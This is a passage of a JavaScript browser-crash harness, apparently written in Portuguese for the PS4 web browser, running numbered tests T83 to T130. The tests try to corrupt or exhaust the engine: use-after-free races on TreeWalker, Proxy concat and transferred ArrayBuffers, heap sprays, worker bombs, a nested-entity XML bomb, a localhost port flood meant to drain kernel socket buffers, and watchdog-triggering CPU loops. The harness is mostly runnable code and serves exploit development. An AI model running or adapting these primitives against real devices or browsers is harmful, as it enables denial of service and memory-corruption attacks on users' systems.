    d.appendChild(document.createTextNode("A".repeat(10000)));
    document.body.appendChild(d);
    
    try {
        for(var i=0; i<2000; i++) {
            var node = d.firstChild;
            if(node && node.nodeType === 3) {
                var split = node.splitText(5000); 
                d.normalize(); 
                
                if(i % 100 === 0) {
                    var r = document.createRange();
                    r.selectNode(d); 
                    r.detach();
                }
            } else {
                d.textContent = "A".repeat(10000);
            }
        }
        document.body.removeChild(d);
        log(">> T83: Text operations finished.");
    } catch(e) { log(">> T83 Crash Logic: " + e.message); }
}

function runTest84() {
    log("Iniciando T84: Property Hash Collision...");
    var obj = {};
    var count = 0;
    
    try {
        // Gera chaves que tendem a colidir em algoritmos de hash simples
        for(var i=0; i<20000; i++) {
            var key = "key_" + i.toString(36) + "_" + (i*31);
            obj[key] = i;
            
            if(i % 1000 === 0) {
                delete obj["key_" + (i-500).toString(36) + "_" + ((i-500)*31)];
            }
        }
        
        var seek = 0;
        for(var k in obj) { seek++; }
        
        log(">> T84: Hash table stress. Keys: " + seek);
    } catch(e) {
        log(">> T84 OOM/Limit: " + e.message);
    }
}

function runTest85() {
    log("Iniciando T85: FormData Multipart Flood...");
    var fd = new FormData();
    var blob = new Blob(["x".repeat(1024)], {type: 'application/octet-stream'});
    
    try {
        for(var i=0; i<5000; i++) {
            fd.append("file" + i, blob, "filename" + i + ".bin");
        }
        
        var req = new XMLHttpRequest();
        req.open("POST", "/dump");
        // Serialização interna do FormData pode estourar buffer
        req.send(fd);
        
        log(">> T85: Huge Multipart payload built.");
    } catch(e) {
        log(">> T85 Serialization Fail: " + e.message);
    }
}

function runTest86() {
    log("Iniciando T86: Worker Thread Bomb...");
    var workers = [];
    var code = "self.onmessage=function(){var i=0;while(true)i++;}"; 
    var blob = new Blob([code], {type: 'application/javascript'});
    var url = URL.createObjectURL(blob);
    
    try {
        var t = setInterval(function() {
            var w = new Worker(url);
            w.postMessage("start");
            workers.push(w);
            
            if(workers.length > 20) { 
                var dead = workers.shift();
                dead.terminate();
            }
            log(".. Thread cycle active");
            
            if(workers.length > 200) clearInterval(t); 
        }, 100);
        
        setTimeout(function() {
            clearInterval(t);
            workers.forEach(w => w.terminate());
            log(">> T86: Thread limit stress stop.");
        }, 5000);
    } catch(e) { log(">> T86 System Limit: " + e.message); }
}

function runTest87() {
    log("Iniciando T87: Sync File Read Lock...");
    var readers = [];
    var huge = new Uint8Array(1024 * 1024 * 5).fill(65);
    var b = new Blob([huge]);
    
    try {
        for(var i=0; i<50; i++) {
            var fr = new FileReader();
            // Leitura síncrona não existe em FileReader padrão, mas simulamos carga pesada
            // disparando múltiplos reads simultâneos em blob grande
            fr.readAsDataURL(b); 
            readers.push(fr);
            
            if(i % 10 === 0) {
                var junk = new ArrayBuffer(1024 * 1024); 
            }
        }
        log(">> T87: I/O buffers saturated.");
    } catch(e) { log(">> T87 Erro: " + e.message); }
}

function runTest88() {
    log("Iniciando T88: Table Layout Recalc OOM...");
    var t = document.createElement('table');
    document.body.appendChild(t);
    t.style.tableLayout = "auto"; 
    
    try {
        for(var r=0; r<200; r++) {
            var row = t.insertRow();
            for(var c=0; c<50; c++) {
                var cell = row.insertCell();
                cell.textContent = "W" + c + "H" + r + " ".repeat(r % 10);
            }
        }
        
        // Força "Reflow" massivo alterando larguras
        setTimeout(function() {
            t.style.width = "10px";
            var x = t.offsetWidth; 
            t.style.width = "10000px";
            var y = t.offsetWidth;
            document.body.removeChild(t);
            log(">> T88: Table Layout Thrashing done.");
        }, 100);
    } catch(e) { log(">> T88 Render Fail: " + e.message); }
}

function runTest89() {
    log("Iniciando T89: Math.pow Watchdog Kill...");
    var res = 0;
    var start = Date.now();
    
    try {
        // Loop "quase" infinito para disparar o watchdog do kernel
        // PS4 mata processos que seguram a CPU por muito tempo
        while(Date.now() - start < 3000) {
            for(var i=0; i<1000; i++) {
                res = Math.pow(Math.random(), Math.random());
            }
            // Pequena pausa para enganar detecção simples, mas manter carga alta
            var arr = new Uint8Array(100); 
        }
        log(">> T89: CPU Stress Test Survived.");
    } catch(e) {
        log(">> T89 Watchdog: " + e.message);
    }
}

function runTest90() {
    log("Iniciando T90: Huge URL Search Params...");
    var params = new URLSearchParams();
    var val = "X".repeat(1000);
    
    try {
        for(var i=0; i<10000; i++) {
            params.append("k"+i, val);
        }
        
        var str = params.toString();
        log(".. Params string len: " + str.length);
        
        var reparse = new URLSearchParams(str);
        reparse.forEach(function(v, k) {
             if(k === "k5000") {
                 reparse.delete("k0"); 
                 var hole = new ArrayBuffer(1024);
             }
        });
        
        log(">> T90: URL parsing/serialization OOM test.");
    } catch(e) {
        log(">> T90 Memory Fail: " + e.message);
    }
}
function runTest91() {
    log("Iniciando T91: TreeWalker Filter UAF...");
    var root = document.createElement('div');
    root.innerHTML = "<div><span></span><b></b></div>".repeat(100);
    document.body.appendChild(root);
    
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'SPAN') {
                node.parentNode.removeChild(node);
                var spray = new Uint8Array(0x20).fill(0x41);
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    }, false);
    
    try {
        while(walker.nextNode()) {
            var curr = walker.currentNode;
            if(curr) curr.textContent = "uaf";
        }
        log(">> T91: TreeWalker traversal finished.");
    } catch(e) { log(">> T91 Erro: " + e.message); }
    document.body.removeChild(root);
}

function runTest92() {
    log("Iniciando T92: Array Concat Spread Poison...");
    var a = [1, 2, 3];
    var p = new Proxy([], {
        get: function(target, prop) {
            if(prop === Symbol.isConcatSpreadable) {
                a.length = 0;
                var junk = new Array(10000).fill(1.1);
                return true;
            }
            if(prop === 'length') return 0xFFFFFFFF;
            return 1;
        }
    });
    
    try {
        var res = a.concat(p);
        log(">> T92: Concat executed. Len: " + res.length);
    } catch(e) {
        log(">> T92 Logic Error: " + e.message);
    }
}

function runTest93() {
    log("Iniciando T93: RegExp LastIndex Overflow...");
    var re = /a/g;
    var str = "a".repeat(1000);
    var count = 0;
    
    try {
        re.lastIndex = 0xFFFFFFF0; 
        
        while(re.exec(str) !== null) {
            count++;
            if(count > 10) break;
        }
        
        re.lastIndex = { valueOf: function() { 
            str = "b".repeat(1000); 
            return 0; 
        }};
        
        re.exec(str);
        log(">> T93: RegExp state manipulation done.");
    } catch(e) { log(">> T93 Erro: " + e.message); }
}

function runTest94() {
    log("Iniciando T94: Textarea Layout Thrashing...");
    var t = document.createElement('textarea');
    document.body.appendChild(t);
    var val = "X".repeat(500);
    
    try {
        for(var i=0; i<1000; i++) {
            t.value = val;
            t.cols = i % 100;
            t.rows = i % 50;
            
            if(i % 10 === 0) {
                t.style.position = (i%2===0) ? "absolute" : "fixed";
                var r = t.getBoundingClientRect(); 
                t.wrap = (i%2===0) ? "off" : "soft";
            }
        }
        log(">> T94: Layout object stressed.");
    } catch(e) { log(">> T94 Erro: " + e.message); }
    document.body.removeChild(t);
}

function runTest95() {
    log("Iniciando T95: FontFace Recursive Load...");
    var fonts = [];
    var depth = 0;
    
    function loadNext() {
        depth++;
        if(depth > 500) return;
        var f = new FontFace('f'+depth, 'url(data:font/woff;base64,AAAA...)');
        fonts.push(f);
        document.fonts.add(f);
        f.load().then(function() {
            loadNext();
            if(depth % 50 === 0) document.fonts.clear();
        }).catch(function(){});
    }
    
    loadNext();
    setTimeout(function() {
        log(">> T95: Font recursion depth: " + depth);
    }, 2000);
}

function runTest96() {
    log("Iniciando T96: Local Port mbuf Exhaustion...");
    var imgs = [];
    var port = 10000;
    
    var t = setInterval(function() {
        for(var i=0; i<50; i++) {
            var img = new Image();
            img.src = "http://127.0.0.1:" + port + "/socket_flood";
            imgs.push(img);
            port++;
        }
        
        if(imgs.length > 5000) {
            // Mantém referências vivas para segurar o socket no kernel (estado SYN_SENT)
            imgs = imgs.slice(2500); 
        }
        
        if(port > 60000) {
            clearInterval(t);
            log(">> T96: Port range scanned/flooded.");
        }
    }, 10);
}

function runTest97() {
    log("Iniciando T97: Blob URL Revocation Race...");
    var urls = [];
    var data = new Uint8Array(1024*1024).fill(0x90);
    var b = new Blob([data]);
    
    var t = setInterval(function() {
        for(var i=0; i<100; i++) {
            var u = URL.createObjectURL(b);
            urls.push(u);
        }
        
        while(urls.length > 0) {
            var target = urls.shift();
            URL.revokeObjectURL(target);
            // Race: Tenta usar URL revogada imediatamente
            var x = new XMLHttpRequest();
            x.open("GET", target, true);
            try { x.send(); } catch(e){}
        }
        
        if(Math.random() > 0.95) log(".. Race cycle active");
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T97: Blob race stopped.");
    }, 3000);
}

function runTest98() {
    log("Iniciando T98: Iframe Nesting Depth Kill...");
    var d = document.createElement('div');
    document.body.appendChild(d);
    var html = "";
    
    for(var i=0; i<4000; i++) {
        html += "<div>";
    }
    html += "<span>Bottom</span>";
    for(var i=0; i<4000; i++) {
        html += "</div>";
    }
    
    try {
        d.innerHTML = html;
        var targets = d.getElementsByTagName("div");
        log(".. Deep DOM created. Nodes: " + targets.length);
        
        // Força renderização pesada
        var h = d.offsetHeight; 
        d.innerHTML = "";
        log(">> T98: Deep nesting parsed and cleared.");
    } catch(e) {
        log(">> T98 Stack Overflow: " + e.message);
    }
}

function runTest99() {
    log("Iniciando T99: Canvas Gradient Mem Leak...");
    var c = document.createElement('canvas');
    c.width = 2000; c.height = 2000;
    var ctx = c.getContext('2d');
    
    try {
        for(var i=0; i<5000; i++) {
            var g = ctx.createLinearGradient(0, 0, 2000, 2000);
            for(var j=0; j<100; j++) {
                g.addColorStop(j/100, "rgb("+ (i%255) +",0,0)");
            }
            ctx.fillStyle = g;
            ctx.fillRect(0,0,100,100);
            
            if(i % 1000 === 0) log(".. Gradients created: " + i);
        }
        log(">> T99: GPU Gradient buffer stress.");
    } catch(e) { log(">> T99 GPU OOM: " + e.message); }
}

function runTest100() {
    log("Iniciando T100: THE OMEGA COMBO...");
    var running = true;
    
    // 1. Thread Stress
    var b = new Blob(["while(true) Math.random();"], {type:'text/javascript'});
    var w = new Worker(URL.createObjectURL(b));
    
    // 2. Memory Stress
    var arr = [];
    var memInt = setInterval(function() {
        if(!running) return;
        try { arr.push(new ArrayBuffer(1024*1024*10)); } catch(e){}
    }, 100);
    
    // 3. DOM/Layout Stress
    var domInt = setInterval(function() {
        if(!running) return;
        var d = document.createElement('div');
        d.innerHTML = "X".repeat(10000);
        document.body.appendChild(d);
        var x = d.offsetWidth;
        document.body.removeChild(d);
    }, 10);
    
    // 4. History Stress
    var histInt = setInterval(function() {
        if(!running) return;
        try { history.pushState({}, "t", "?t="+Math.random()); } catch(e){}
    }, 50);

    setTimeout(function() {
        running = false;
        w.terminate();
        clearInterval(memInt);
        clearInterval(domInt);
        clearInterval(histInt);
        arr = null;
        log(">> T100: Combo finished. Check system stability.");
    }, 5000);
}
function runTest101() {
    log("Iniciando T101: Attribute Node SetNamedItem Race...");
    var el = document.createElement('div');
    var attr = document.createAttribute('test');
    attr.value = "A".repeat(100);
    var running = true;
    
    setTimeout(function() { running = false; log(">> T101: Race stopped."); }, 3000);
    
    function race() {
        if(!running) return;
        try {
            el.setAttributeNode(attr);
            var removed = el.removeAttributeNode(attr);
            if(Math.random() > 0.5) {
                removed.value = "B".repeat(200); 
            }
            // Tenta corromper a referência do atributo reutilizando-o imediatamente
            el.setAttributeNode(removed);
        } catch(e) {}
        setTimeout(race, 0);
    }
    race();
}

function runTest102() {
    log("Iniciando T102: Event Listener Remove-Add Loop...");
    var t = document.createElement('div');
    var count = 0;
    
    function handler() {
        count++;
        var junk = new Uint32Array(100);
    }
    
    try {
        for(var i=0; i<10000; i++) {
            t.addEventListener('click', handler);
            if(i % 2 === 0) t.removeEventListener('click', handler);
            
            if(i % 1000 === 0) {
                // Força re-indexing da lista interna de listeners
                var ev = new Event('click');
                t.dispatchEvent(ev);
            }
        }
        log(">> T102: Listener list churn finished.");
    } catch(e) { log(">> T102 Erro: " + e.message); }
}

function runTest103() {
    log("Iniciando T103: Canvas GetContext Type Flip...");
    var c = document.createElement('canvas');
    var count = 0;
    
    try {
        for(var i=0; i<500; i++) {
            // Tenta confundir o estado interno do canvas pedindo contextos diferentes
            // Mesmo que spec diga que retorna null, a implementação pode falhar na limpeza
            var ctx2d = c.getContext('2d');
            var ctxGl = c.getContext('webgl'); 
            
            if(ctx2d) {
                ctx2d.fillStyle = "red";
                ctx2d.fillRect(0,0,10,10);
            }
            
            // Recria o elemento para resetar, mas mantém referência antiga no GC
            if(i % 50 === 0) {
                c = document.createElement('canvas');
                c.width = 1000; c.height = 1000;
            }
            count++;
        }
        log(">> T103: Context flipping attempts: " + count);
    } catch(e) { log(">> T103 Erro: " + e.message); }
}

function runTest104() {
    log("Iniciando T104: XMLSerializer Recursive Bomb...");
    var doc = document.implementation.createDocument(null, "root", null);
    var root = doc.documentElement;
    var curr = root;
    
    // Cria árvore XML muito profunda
    for(var i=0; i<3000; i++) {
        var el = doc.createElement("node");
        curr.appendChild(el);
        curr = el;
    }
    
    try {
        var s = new XMLSerializer();
        var str = s.serializeToString(doc);
        log(">> T104: Serialized length: " + str.length);
    } catch(e) {
        log(">> T104 Stack Overflow: " + e.message);
    }
}

function runTest105() {
    log("Iniciando T105: Object GetOwnPropertyDescriptor Stress...");
    var obj = {};
    for(var i=0; i<2000; i++) obj["p"+i] = i;
    
    try {
        var start = Date.now();
        while(Date.now() - start < 2000) {
            for(var i=0; i<2000; i++) {
                var d = Object.getOwnPropertyDescriptor(obj, "p"+i);
                if(d.value !== i) throw "Corruption";
                
                // Cria objetos descritores temporários rapidamento
                if(i % 100 === 0) {
                    Object.defineProperty(obj, "p"+i, {enumerable: false});
                }
            }
        }
        log(">> T105: Descriptor allocation stress done.");
    } catch(e) { log(">> T105 Erro: " + e.message); }
}

function runTest106() {
    log("Iniciando T106: Iframe Src Blob Recursion...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var html = "<script>if(window.parent) window.parent.postMessage('ping', '*');<\/script>";
    var blob = new Blob([html], {type: 'text/html'});
    var url = URL.createObjectURL(blob);
    var frames = [];
    
    var t = setInterval(function() {
        var f = document.createElement('iframe');
        f.src = url;
        container.appendChild(f);
        frames.push(f);
        
        if(frames.length > 200) {
            container.removeChild(frames.shift());
        }
        
        if(frames.length > 500) {
             clearInterval(t);
             log(">> T106: Frame cycle finished.");
        }
    }, 20);
}

function runTest107() {
    log("Iniciando T107: XHR Abort Race Condition...");
    var reqs = [];
    
    var t = setInterval(function() {
        for(var i=0; i<10; i++) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "/" + Math.random(), true);
            xhr.send();
            reqs.push(xhr);
            
            // Aborta imediatamente enquanto ainda está conectando
            // Tenta causar uso de ponteiro inválido no callback interno
            xhr.abort();
            
            // Reutiliza objeto abortado (algumas implementações antigas crashavam aqui)
            try { xhr.open("GET", "/", true); } catch(e){}
        }
        
        if(reqs.length > 2000) {
            reqs = [];
            log(".. XHR pool flushed");
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T107: Network race stopped.");
    }, 3000);
}

function runTest108() {
    log("Iniciando T108: FileReader Sync Freeze...");
    var b = new Blob(["A".repeat(1024*1024*2)]);
    var readers = [];
    
    try {
        // Dispara múltiplas leituras simultâneas de blob grande
        for(var i=0; i<50; i++) {
            var fr = new FileReader();
            fr.readAsDataURL(b);
            readers.push(fr);
            
            // Força GC no blob original durante a leitura
            if(i === 25) {
                b = new Blob(["X"]); 
                var spray = new Uint8Array(1024*1024).fill(0xCC);
            }
        }
        log(">> T108: File readers queued.");
    } catch(e) { log(">> T108 Erro: " + e.message); }
}

function runTest109() {
    log("Iniciando T109: Huge Math Random Buffer...");
    var size = 1024 * 1024 * 20; // 20MB floats
    try {
        var f32 = new Float32Array(size);
        var start = Date.now();
        
        // Loop otimizado para preencher memória rapidamente
        for(var i=0; i<size; i+=8) {
            var r = Math.random();
            f32[i] = r; f32[i+1] = r; f32[i+2] = r; f32[i+3] = r;
            f32[i+4] = r; f32[i+5] = r; f32[i+6] = r; f32[i+7] = r;
        }
        
        // Tenta soma massiva para forçar paginação
        var sum = 0;
        for(var j=0; j<size; j+=100) sum += f32[j];
        
        log(">> T109: Buffer processed in " + (Date.now()-start) + "ms");
    } catch(e) {
        log(">> T109 OOM: " + e.message);
    }
}

function runTest110() {
    log("Iniciando T110: DOM Imp CreateDoc Flood...");
    var docs = [];
    var imp = document.implementation;
    
    try {
        var t = setInterval(function() {
            for(var i=0; i<50; i++) {
                // Cria documentos XML desconectados
                var d = imp.createDocument(null, "root"+i, null);
                var el = d.createElement("child");
                el.textContent = "Data".repeat(100);
                d.documentElement.appendChild(el);
                docs.push(d);
            }
            
            if(docs.length > 5000) {
                // Destrói referências em massa
                docs = []; 
                log(".. Documents flushed (GC pressure)");
            }
        }, 20);
        
        setTimeout(function() {
            clearInterval(t);
            log(">> T110: Document flood stopped.");
        }, 4000);
    } catch(e) { log(">> T110 Erro: " + e.message); }
}
function runTest111() {
    log("Iniciando T111: Array Buffer Neutering Race...");
    var ab = new ArrayBuffer(1024 * 1024);
    var w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var count = 0;
    
    var t = setInterval(function() {
        try {
            if(ab.byteLength > 0) {
                w.postMessage(ab, [ab]);
                // Tenta acessar buffer transferido imediatamente
                var view = new Uint8Array(ab);
                view[0] = 1; 
            } else {
                ab = new ArrayBuffer(1024 * 1024);
                // Heap Spray para preencher o vazio
                var spray = new Array(100).fill(new Float64Array(128));
            }
            count++;
            if(count > 2000) {
                clearInterval(t);
                w.terminate();
                log(">> T111: Neutering cycle finished.");
            }
        } catch(e) {}
    }, 1);
}

function runTest112() {
    log("Iniciando T112: Prototype Pollution Chain...");
    var root = Object.prototype;
    var chain = [];
    
    try {
        for(var i=0; i<5000; i++) {
            var key = "prop_" + Math.random().toString(36).substring(7);
            Object.defineProperty(root, key, {
                get: function() { 
                    var temp = new Uint8Array(1024);
                    return temp.fill(0x41); 
                },
                configurable: true
            });
            chain.push(key);
            
            if(i % 100 === 0) {
                // Força iteração em objeto limpo para disparar getters poluidos
                var clean = {};
                for(var k in clean) {}
            }
        }
        
        chain.forEach(k => delete root[k]);
        log(">> T112: Global prototype stressed.");
    } catch(e) { log(">> T112 Limit: " + e.message); }
}

function runTest113() {
    log("Iniciando T113: Event Dispatch Recursive Trap...");
    var d = document.createElement('div');
    var depth = 0;
    
    d.addEventListener('click', function(e) {
        depth++;
        if(depth < 2000) {
            var evt = new MouseEvent('click', {bubbles: true, cancelable: true});
            // Tenta modificar o evento durante o dispatch
            Object.defineProperty(evt, 'target', {value: null});
            d.dispatchEvent(evt);
        } else {
            var heavy = new Array(5000).join('x');
        }
    });
    
    try {
        d.dispatchEvent(new MouseEvent('click'));
        log(">> T113: Recursion depth: " + depth);
    } catch(e) { log(">> T113 Stack: " + e.message); }
}

function runTest114() {
    log("Iniciando T114: DOMStringMap Property Flood...");
    var el = document.createElement('div');
    var ds = el.dataset;
    var count = 0;
    
    try {
        var start = Date.now();
        while(Date.now() - start < 3000) {
            var key = "data" + count;
            ds[key] = "val" + count; 
            
            // Remove aleatoriamente para fragmentar
            if(count % 2 === 0) delete ds["data" + (count - 1)];
            
            if(count % 1000 === 0) {
                // Converte para atributos reais
                var attrs = el.attributes.length;
            }
            count++;
        }
        log(">> T114: Dataset operations: " + count);
    } catch(e) { log(">> T114 Erro: " + e.message); }
}

function runTest115() {
    log("Iniciando T115: Selection Extend Crash...");
    var s = window.getSelection();
    var d = document.createElement('div');
    d.contentEditable = true;
    d.innerHTML = "A".repeat(5000);
    document.body.appendChild(d);
    
    try {
        var r = document.createRange();
        r.selectNodeContents(d);
        s.removeAllRanges();
        s.addRange(r);
        
        for(var i=0; i<1000; i++) {
            s.extend(d, i);
            // Modifica o DOM sob a seleção ativa
            d.innerHTML = "B".repeat(5000 - i); 
            
            if(i % 50 === 0) {
                var junk = document.createTextNode("junk");
                d.appendChild(junk);
                s.extend(junk, 0);
            }
        }
        document.body.removeChild(d);
        log(">> T115: Selection stress finished.");
    } catch(e) { log(">> T115 Erro: " + e.message); }
}

function runTest116() {
    log("Iniciando T116: Canvas 2D Path Explosion...");
    var c = document.createElement('canvas');
    c.width = 4096; c.height = 4096;
    var ctx = c.getContext('2d');
    
    if(ctx) {
        ctx.beginPath();
        var points = 100000;
        
        try {
            for(var i=0; i<points; i++) {
                ctx.lineTo(Math.random() * 4000, Math.random() * 4000);
                if(i % 1000 === 0) {
                    // Cria sub-caminhos complexos para estourar buffer de vértices
                    ctx.arc(2000, 2000, i/100, 0, Math.PI*2);
                    ctx.rect(i%100, i%100, 50, 50);
                }
            }
            ctx.fillStyle = "red";
            ctx.fill('evenodd'); 
            log(">> T116: Path rendered with " + points + " nodes.");
        } catch(e) { log(">> T116 GPU Panic: " + e.message); }
    }
}

function runTest117() {
    log("Iniciando T117: XHR Sync Blob Leak...");
    var blobs = [];
    var t = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", window.location.href, false);
        try {
            xhr.responseType = "blob"; 
            xhr.send();
            if(xhr.response) {
                blobs.push(xhr.response);
            }
            
            // Não libera os blobs, força o kernel a segurar handles de arquivos temp
            if(blobs.length > 500) {
                log(".. Blobs held: " + blobs.length);
                if(blobs.length > 5000) clearInterval(t);
            }
        } catch(e) {
            clearInterval(t);
            log(">> T117 FD Limit: " + e.message);
        }
    }, 10);
}

function runTest118() {
    log("Iniciando T118: LocalStorage Quota Thrasher...");
    localStorage.clear();
    var k = "key";
    var v = "x".repeat(1024*1024); 
    
    try {
        var i = 0;
        while(true) {
            localStorage.setItem(k + i, v);
            i++;
            // Tenta remover e adicionar imediatamente para causar fragmentação no DB
            if(i > 2) {
                localStorage.removeItem(k + (i-2));
                localStorage.setItem(k + (i-2), "small");
            }
            if(i > 100) break; 
        }
    } catch(e) {
        // Quando quota atingida, tenta operação massiva de replace
        try {
            localStorage.clear();
            var huge = "A".repeat(1024 * 1024 * 10);
            localStorage.setItem("KILL", huge);
        } catch(z) {}
        log(">> T118: Storage thrashing trigger.");
    }
}

function runTest119() {
    log("Iniciando T119: Nested Worker Bomber...");
    var code = `
        self.onmessage = function(e) {
            if(e.data > 0) {
                var w = new Worker(self.location.href); // Auto-referência falha em blob, mas...
                // Fallback para loop de memória se worker falhar
                var arr = new Uint32Array(100000);
            }
        };
    `;
    // Usa Blob URL para criar workers que criam workers (se suportado) ou consomem RAM
    var b = new Blob(["var i=0; setInterval(function(){i++; new Float64Array(10000);}, 10);"], {type:'text/javascript'});
    var url = URL.createObjectURL(b);
    var workers = [];
    
    try {
        for(var i=0; i<50; i++) {
            workers.push(new Worker(url));
        }
        setTimeout(function() {
            workers.forEach(w => w.terminate());
            log(">> T119: Worker bomb stop.");
        }, 4000);
        log(">> T119: 50 Workers launched.");
    } catch(e) { log(">> T119 Limit: " + e.message); }
}

function runTest120() {
    log("Iniciando T120: Iframe History State DoS...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    f.onload = function() {
        try {
            var w = f.contentWindow;
            var spam = setInterval(function() {
                for(var i=0; i<50; i++) {
                    w.history.pushState({id: i, junk: new Array(100).join("z")}, "t"+i, "/"+i);
                    count++;
                }
                if(count > 10000) {
                    clearInterval(spam);
                    document.body.removeChild(f);
                    log(">> T120: History flood finish. States: " + count);
                }
            }, 10);
        } catch(e) { log(">> T120 Erro: " + e.message); }
    };
    f.src = "about:blank";
}
function runTest121() {
    log("Iniciando T121: Message Port Transfer Race...");
    var c = new MessageChannel();
    var p1 = c.port1;
    var p2 = c.port2;
    var t = setInterval(function() {
        try {
            // Tenta transferir a porta para ela mesma enquanto posta mensagem
            // Isso estressa o mecanismo de serialização de portas do WebKit
            p1.postMessage("race", [p2]);
            var c_new = new MessageChannel();
            p2 = c_new.port2; 
            
            // Aloca buffers pequenos para forçar GC rápido nas portas antigas
            var trash = new Uint8Array(100);
        } catch(e) {
            clearInterval(t);
            log(">> T121 Race End: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T121: Port race stopped.");
    }, 2000);
}

function runTest122() {
    log("Iniciando T122: DOM Parser Recursive Entity...");
    var parser = new DOMParser();
    var xml = '<!DOCTYPE doc [ <!ENTITY x "foo"> <!ENTITY y "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;"> ]>';
    xml += '<root>' + '&y;'.repeat(1000) + '</root>';
    
    try {
        var res = parser.parseFromString(xml, "text/xml");
        var str = new XMLSerializer().serializeToString(res);
        log(">> T122: Parsed Len: " + str.length);
        
        // Tenta acessar nodos profundos resultantes da expansão
        var walker = document.createTreeWalker(res, NodeFilter.SHOW_TEXT, null, false);
        var count = 0;
        while(walker.nextNode()) count++;
        log(".. Text nodes found: " + count);
    } catch(e) {
        log(">> T122 XML Limit: " + e.message);
    }
}

function runTest123() {
    log("Iniciando T123: Form Validation Bubble Trap...");
    var f = document.createElement('form');
    var i = document.createElement('input');
    i.required = true;
    f.appendChild(i);
    document.body.appendChild(f);
    
    i.addEventListener('invalid', function(e) {
        // Recursão dentro do evento de validação bloqueia a UI thread
        // e cria pressão no stack de eventos
        var div = document.createElement('div');
        div.innerHTML = "X".repeat(1000);
        f.appendChild(div);
        
        if(f.childNodes.length < 2000) {
            i.checkValidity(); 
        } else {
            document.body.removeChild(f);
        }
    });
    
    try {
        i.checkValidity();
        log(">> T123: Validation trap triggered.");
    } catch(e) { log(">> T123 Stack: " + e.message); }
}

function runTest124() {
    log("Iniciando T124: Selection Range Collapse Loop...");
    var s = window.getSelection();
    var d = document.createElement('div');
    d.textContent = "TestData".repeat(100);
    document.body.appendChild(d);
    
    try {
        var r = document.createRange();
        r.selectNode(d);
        s.addRange(r);
        
        for(var i=0; i<5000; i++) {
            // Colapso rápido seguido de extensão força recálculo de layout
            s.collapse(d, 0);
            s.extend(d.firstChild, i % 100);
            
            if(i % 100 === 0) {
                // Modifica o texto para invalidar os offsets da seleção
                d.firstChild.splitText(50);
                d.normalize();
            }
        }
        document.body.removeChild(d);
        log(">> T124: Selection collapse stress done.");
    } catch(e) { log(">> T124 Erro: " + e.message); }
}

function runTest125() {
    log("Iniciando T125: Text Node Data Replace Overflow...");
    var t = document.createTextNode("Start");
    var huge = "A".repeat(10000);
    
    try {
        for(var i=0; i<1000; i++) {
            // replaceData com offset móvel e tamanho crescente
            t.replaceData(0, 5, huge);
            // Corta para evitar estouro imediato de memória JS, focando no churn do buffer interno
            t.data = t.data.substring(0, 100); 
            
            if(i % 50 === 0) {
                var spray = new Uint32Array(0x100).fill(0x12345678);
            }
        }
        log(">> T125: Data replacement cycle finished.");
    } catch(e) { log(">> T125 Erro: " + e.message); }
}

function runTest126() {
    log("Iniciando T126: SetTimeout Heap Flood...");
    var timers = [];
    var count = 0;
    
    function flood() {
        // Cria milhares de timers com closures que seguram memória
        var junk = new Array(100).join("z"); 
        var id = setTimeout(function() {
            var use = junk + count; 
        }, 10000 + count); // Delay longo para acumular no heap do kernel
        timers.push(id);
        count++;
        
        if(count < 50000) {
            // Agenda múltiplos por ciclo de loop para velocidade
            setTimeout(flood, 0);
            setTimeout(flood, 0);
            setTimeout(flood, 0);
        } else {
            log(">> T126: 50k Timers queued.");
        }
    }
    flood();
}

function runTest127() {
    log("Iniciando T127: XHR Response Text OOM...");
    var reqs = [];
    var t = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", window.location.href, true);
        xhr.onreadystatechange = function() {
            if(this.readyState == 4) {
                // Duplica a resposta na memória várias vezes
                var s = this.responseText;
                var s2 = s + s + s + s; 
                this.temp = s2; 
            }
        };
        xhr.send();
        reqs.push(xhr);
        
        if(reqs.length > 500) {
            log(".. XHR Objects holding text: " + reqs.length);
            if(reqs.length > 2000) clearInterval(t);
        }
    }, 10);
}

function runTest128() {
    log("Iniciando T128: Canvas PutImageData Align Fail...");
    var c = document.createElement('canvas');
    c.width = 1023; // Largura não potência de 2/4/8 para testar alinhamento
    c.height = 1023;
    var ctx = c.getContext('2d');
    
    try {
        var buf = new Uint8ClampedArray(1023 * 1023 * 4);
        buf.fill(128);
        var img = new ImageData(buf, 1023, 1023);
        
        for(var i=0; i<100; i++) {
            ctx.putImageData(img, 0, 0);
            // Lê de volta com offset estranho
            var sub = ctx.getImageData(1, 1, 1000, 1000);
            
            if(i % 10 === 0) {
                // Aloca textura GPU concorrente
                var tempC = document.createElement('canvas');
                tempC.width = 2048; tempC.height = 2048;
                tempC.getContext('2d').fillRect(0,0,1,1);
            }
        }
        log(">> T128: Unaligned image data transfer done.");
    } catch(e) { log(">> T128 GPU Error: " + e.message); }
}

function runTest129() {
    log("Iniciando T129: Blob Slice Recursion Depth...");
    var base = new Blob(["start".repeat(1000)]);
    var curr = base;
    
    try {
        for(var i=0; i<1000; i++) {
            // Cria cadeia profunda de referências de Blob
            // Kernel precisa rastrear offset + parent para cada fatia
            curr = curr.slice(1, curr.size);
            
            if(i % 100 === 0) {
                var u = URL.createObjectURL(curr);
                // Não revoga URL para manter a cadeia viva
            }
        }
        log(">> T129: Blob slicing depth 1000 reached.");
    } catch(e) {
        log(">> T129 Limit: " + e.message);
    }
}

function runTest130() {
    log("Iniciando T130: Iframe Reload Memory Leak...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    f.onload = function() {
        count++;
        // Cria objetos grandes no contexto do frame antes de recarregar
        try {
            f.contentWindow.leak = new Array(100000).fill(1.2345);
            f.contentWindow.document.body.innerHTML = "<div></div>".repeat(2000);
        } catch(e){}
        
        if(count < 200) {
            f.contentWindow.location.reload();
        } else {
            document.body.removeChild(f);
